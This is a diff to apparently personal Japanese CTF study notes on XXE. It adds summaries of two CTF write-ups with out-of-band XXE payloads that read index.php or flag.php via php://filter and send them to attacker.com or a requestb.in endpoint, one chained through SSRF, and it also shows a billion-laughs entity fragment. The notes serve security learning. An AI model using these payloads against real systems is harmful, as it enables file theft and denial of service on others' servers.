@@ -121,9 +121,63 @@ POST http://example.com/xml.php HTTP/1.1
 ]>
 <lolz>&lol9;</lolz>
 ```
+# writeup
+## OOB XXE (obtain index.php / indentify webshell's fullpath)
+https://github.com/shvetsovalex/ctf/tree/master/2018/VolgaCTF-quals/Shop%20quest   
+- **entrypoint**   
+製品情報をXML形式で保存するのでXXEに脆弱かも？と考える。   
+- **概要**   
+webshellはアップできていてもそのフルパスがわからない。その時に`index.php`をOOB XXEで閲覧してソースを読んでファイルパスを特定する。   
+- **Payload**   
+```txt
+// 多分これをPOSTするかんじ
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://attacker.com/oob.xml">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+
+// oob.xml   (これは攻撃者サーバーにセット)
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
+```
+## OOB XXE (SSRF / 二重XXE)
+https://qiita.com/no1zy_sec/items/03b8f335e84995fec3e3   
+- **entrypoint**   
+問題文が`xmlvalidator`だからXXEを疑う？   
+- **概要**   
+ローカルネットワークからしかアクセスできないので別のXMLの問題のページからXXEでページを読み込む(ソースではない)   
+`loadxml`に`$_REQUEST['xml']`の内容が入るのでまたXXE脆弱。応答を返さないのでOOB XXEで攻撃者サーバーにアクセスさせる。      
+- **Payload**   
+```txt
+// 別の問題ページから送信する内容　（2重にXXEしてる）
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY bar SYSTEM
+  "php://filter/convert.base64-encode/resource=http://xmlvalidator/?xml=%3C%21DOCTYPE+root+%5B%3C%21ELEMENT+root+ANY+%3E%3C%21ENTITY+%25+xxe+SYSTEM+%22https%3A%2F%2Fexample.com%2Fxxe.dtd%22%3E%25xxe%3B%5D%3E%3Croot%3E%26startme%3B%3Croot%3E">
+]>
+<foo>
+  &bar;
+</foo>
+
+
+// xxe.dtd (攻撃者サーバーに用意する)
+<!ENTITY % filebase64 SYSTEM "php://filter/convert.base64-encode/resource=flag.php">
+<!ENTITY % injme '<!ENTITY startme SYSTEM "https://requestb.in/xxxxxxx?xxe=%filebase64;">'>%injme;
+```
+## sample
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+
 # メモ
 `hackerone report xxe`とかでググるといろいろ出てくる。   
 `xxe ctf`,`xxe vulnhub`,`xxe hackthebox`とか。   
+応答が返ってくるかで、普通のXXEかOOB XXEかが判別できそう。   
+
 # 参考
 https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md   
 チートシート   
